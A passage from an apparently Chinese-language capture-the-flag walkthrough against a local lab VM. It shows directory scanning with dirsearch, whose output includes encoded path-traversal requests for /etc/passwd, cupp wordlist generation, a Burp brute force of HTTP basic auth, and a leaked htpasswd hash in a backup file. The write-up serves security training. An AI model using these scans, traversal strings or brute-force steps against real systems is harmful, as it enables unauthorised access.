number">28.42</span> seconds</pre></td></tr></table></figure><p>这里我们发现靶机开放了 <code>21、22、80、8011</code> 四个端口，下面对四个开放端口分别进行探测。</p><h2 id="漏洞探测"><a class="anchor" href="#漏洞探测">#</a> 漏洞探测</h2><h3 id="ftp-服务"><a class="anchor" href="#ftp-服务">#</a> ftp 服务</h3><p>既然服务器开放了 <code>21端口</code> ，提供 <code>ftp服务</code> ，那我们就先通过浏览器访问看一下是否存在有用的信息：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">ftp</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">:</span><span class="token number">21</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180224285-901553093.png" alt="image"></p><p>可以看到这里并没有发现什么有用的东西，接下来就对 <code>http服务</code> 端口进行访问。</p><h3 id="http-服务"><a class="anchor" href="#http-服务">#</a> http 服务</h3><p><code>80端口</code> 和 <code>8011端口</code> 都开放了 http 服务，我们这里先访问一下 80 端口：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180258599-123367972.png" alt="image"></p><p>这里发现是一个静态页面，应该是一个个人简历，网站的主人是 <code>Frank</code> ，页面上并没有给出什么有用的信息，但是应该可以尝试暴力破解。</p><p>查看一下源码：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180316270-1453740298.png" alt="image"></p><p>同样没发现什么有用的信息。</p><p>那我们就对其目录进行扫描看看能不能发现什么有用的信息：</p><p>这里涉及到 <code>dirsearch</code> 工具，没有安装的直接使用 <code>git clone</code> 命令安装就好了</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>git clone https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>maurosoria<span class="token operator">/</span>dirsearch</pre></td></tr></table></figure><p>安装好后就执行如下命令对其目录进行扫描：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>python3 dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://192.168.56.118/"</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180350888-325840903.png" alt="image"></p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>_<span class="token operator">|</span><span class="token punctuation">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0<span class="token punctuation">.</span><span class="token number">4.2</span>                                           </pre></td></tr><tr><td data-num="2"></td><td><pre> <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">/</span><span class="token function">_</span><span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>                                                    </pre></td></tr><tr><td data-num="3"></td><td><pre>                                                                           </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token literal-property property">Extensions</span><span class="token operator">:</span> php<span class="token punctuation">,</span> aspx<span class="token punctuation">,</span> jsp<span class="token punctuation">,</span> html<span class="token punctuation">,</span> js <span class="token operator">|</span> <span class="token constant">HTTP</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token constant">GET</span> <span class="token operator">|</span> Threads<span class="token operator">:</span> <span class="token number">30</span> <span class="token operator">|</span> Wordlist size<span class="token operator">:</span> <span class="token number">10929</span>                                                          </pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>Output File<span class="token operator">:</span> <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>dirsearch<span class="token operator">-</span>master<span class="token operator">/</span>reports<span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">/</span><span class="token operator">-</span>_21<span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12_04</span><span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>Error Log<span class="token operator">:</span> <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>dirsearch<span class="token operator">-</span>master<span class="token operator">/</span>logs<span class="token operator">/</span>errors<span class="token operator">-</span><span class="token number">21</span><span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12_04</span><span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">.</span>log</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token literal-property property">Target</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">192.168.56.118</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">24</span><span class="token punctuation">]</span> Starting<span class="token operator">:</span> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token number">301</span> <span class="token operator">-</span>  313B  <span class="token operator">-</span> <span class="token operator">/</span>js  <span class="token operator">-</span><span class="token operator">></span>  http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">/</span>js<span class="token operator">/</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token number">400</span> <span class="token operator">-</span>  306B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span>etc<span class="token operator">/</span>passwd</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  293B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>ht_wsr<span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>bak1</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  297B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_extra</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  294B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_sc</pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>orig</pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>sample</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  286B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htm</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  294B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessOLD</pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_orig</pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  295B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessOLD2</pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  294B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessBAK</pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>save</pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  287B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htpasswd_test</pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  292B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htpasswds</pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  293B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>httr<span class="token operator">-</span>oauth</pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>    1KB <span class="token operator">-</span> <span class="token operator">/</span><span class="token constant">LICENSE</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>    4KB <span class="token operator">-</span> <span class="token operator">/</span><span class="token constant">README</span><span class="token punctuation">.</span>md</pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  290B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">cgi-bin</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token number">400</span> <span class="token operator">-</span>  306B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">cgi-bin</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span>etc<span class="token operator">/</span>passwd</pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">301</span> <span class="token operator">-</span>  314B  <span class="token operator">-</span> <span class="token operator">/</span>css  <span class="token operator">-</span><span class="token operator">></span>  http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">/</span>css<span class="token operator">/</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">401</span> <span class="token operator">-</span>  481B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">development</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  290B  <span class="token operator">-</span> <span class="token operator">/</span>doc<span class="token operator">/</span>api<span class="token operator">/</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  301B  <span class="token operator">-</span> <span class="token operator">/</span>doc<span class="token operator">/</span>en<span class="token operator">/</span>changes<span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  300B  <span class="token operator">-</span> <span class="token operator">/</span>doc<span class="token operator">/</span>stable<span class="token punctuation">.</span>version</pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  301B  <span class="token operator">-</span> <span class="token operator">/</span>doc<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  286B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">doc</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>    3KB <span class="token operator">-</span> <span class="token operator">/</span>gulpfile<span class="token punctuation">.</span>js</pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token number">301</span> <span class="token operator">-</span>  314B  <span class="token operator">-</span> <span class="token operator">/</span>img  <span class="token operator">-</span><span class="token operator">></span>  http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">/</span>img<span class="token operator">/</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>   13KB <span class="token operator">-</span> <span class="token operator">/</span>index<span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>  334B  <span class="token operator">-</span> <span class="token operator">/</span>index</pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">41</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>    1KB <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">js</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>   21B  <span class="token operator">-</span> <span class="token operator">/</span>robots<span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  295B  <span class="token operator">-</span> <span class="token operator">/</span>server<span class="token operator">-</span>status</pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">server-status</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">53</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>    2KB <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">vendor</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre>Task Completed</pre></td></tr></table></figure><p>这里根据得到的信息可以发现几个有趣的目录，我们进去看一下：</p><p>在 <code>development</code> 页面我们发现了一个认证框：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180417846-890884622.png" alt="image"></p><p>我们尝试一下暴力破解：</p><p>这里涉及到使用 <code>cupp工具</code> 生成密码字典，同样使用 <code>git指令</code> 下载安装</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>git clone https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>jeanphorn<span class="token operator">/</span>common<span class="token operator">-</span>password<span class="token punctuation">.</span>git</pre></td></tr></table></figure><p>我们先用之前在主页获得的用户信息使用 <code>cupp脚本</code> 简单生成一个密码字典：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>python2 cupp<span class="token punctuation">.</span>py <span class="token operator">-</span>i</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180443588-1482650771.png" alt="image"></p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Insert the informations about the victim to make a dictionary</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> If you don't know all the info<span class="token punctuation">,</span> just hit enter when asked<span class="token operator">!</span> <span class="token punctuation">;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">></span> Name<span class="token operator">:</span> Frank</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">></span> Surname<span class="token operator">:</span> </pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">></span> Nickname<span class="token operator">:</span> </pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">></span> <span class="token function">Birthdate</span> <span class="token punctuation">(</span><span class="token constant">DDMMYYYY</span><span class="token punctuation">)</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">></span> Wife<span class="token string">'s(husband'</span>s<span class="token punctuation">)</span> name<span class="token operator">:</span> </pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">></span> Wife<span class="token string">'s(husband'</span>s<span class="token punctuation">)</span> nickname<span class="token operator">:</span> </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">></span> Wife<span class="token string">'s(husband'</span>s<span class="token punctuation">)</span> <span class="token function">birthdate</span> <span class="token punctuation">(</span><span class="token constant">DDMMYYYY</span><span class="token punctuation">)</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">></span> Child's name<span class="token operator">:</span> </pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">></span> Child's nickname<span class="token operator">:</span> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token operator">></span> Child's <span class="token function">birthdate</span> <span class="token punctuation">(</span><span class="token constant">DDMMYYYY</span><span class="token punctuation">)</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token operator">></span> Pet's name<span class="token operator">:</span> </pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token operator">></span> Company name<span class="token operator">:</span> </pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token operator">></span> Do you want to add some key words about the victim<span class="token operator">?</span> <span class="token constant">Y</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token operator">></span> Do you want to add special chars at the end <span class="token keyword">of</span> words<span class="token operator">?</span> <span class="token constant">Y</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token operator">></span> Do you want to add some random numbers at the end <span class="token keyword">of</span> words<span class="token operator">?</span> <span class="token constant">Y</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token constant">N</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token operator">></span> Leet mode<span class="token operator">?</span> <span class="token punctuation">(</span>i<span class="token punctuation">.</span>e<span class="token punctuation">.</span> leet <span class="token operator">=</span> <span class="token number">1337</span><span class="token punctuation">)</span> <span class="token constant">Y</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Now making a dictionary<span class="token operator">...</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Sorting list and removing duplicates<span class="token operator">...</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Saving dictionary to frank<span class="token punctuation">.</span>txt<span class="token punctuation">,</span> counting <span class="token number">12</span> words<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Now load your pistolero <span class="token keyword">with</span> frank<span class="token punctuation">.</span>txt and shoot<span class="token operator">!</span> Good luck<span class="token operator">!</span></pre></td></tr></table></figure><p>使用 <code>bp抓包</code> ，记得打开浏览器的代理哦！</p><p>抓包发现网站使用 base64 编码认证（username:password），我们在这里添加爆破位置：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180520566-982677562.png" alt="image"></p><p>使用用户自定义模式：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180536492-1899759655.png" alt="image"></p><p>在第一个位置添加一些可能的用户名，第二个位置使用冒号分隔用户名和密码：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180601663-855826072.png" alt="image"></p><p>在第三个位置加载一个常用密码字典和我们之前生成的密码字典：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180612738-356093366.png" alt="image"></p><p>设置 base64 编码模式，关闭对特殊字符的 url 编码：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180627199-2118212303.png" alt="image"></p><p>开始爆破：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180641562-989467674.png" alt="image"></p><p>好吧，白高兴一场，并没有爆破成功 QAQ！</p><p>那就再去尝试下其他办法吧！</p><p>从之前得到的信息上我们可以发现有一个 <code>robots</code> ，那我们就去看一下 <code>robots.txt</code> ，看看有没有什么敏感目录：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180709605-1722574234.png" alt="image"></p><p>好吧，还是什么都没有 ==、</p><p>再重新翻阅一下之前扫描目录时得到信息，发现这里有一份备份文件，下载下来看一下：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">/</span>index<span class="token punctuation">.</span>html<span class="token punctuation">.</span>bak</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>h1<span class="token operator">></span>It works<span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">&lt;</span>p<span class="token operator">></span>This is the <span class="token keyword">default</span> web page <span class="token keyword">for</span> <span class="token keyword">this</span> server<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">&lt;</span>p<span class="token operator">></span>The web server software is running but no content has been added<span class="token punctuation">,</span> yet<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"/development"</span><span class="token operator">></span>development<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token constant">I</span> will use frank<span class="token operator">:</span>$apr1$1oIGDEDK$<span class="token operator">/</span>aVFPluYt56UvslZMBDoC0 <span class="token keyword">as</span> the <span class="token punctuation">.</span>htpasswd 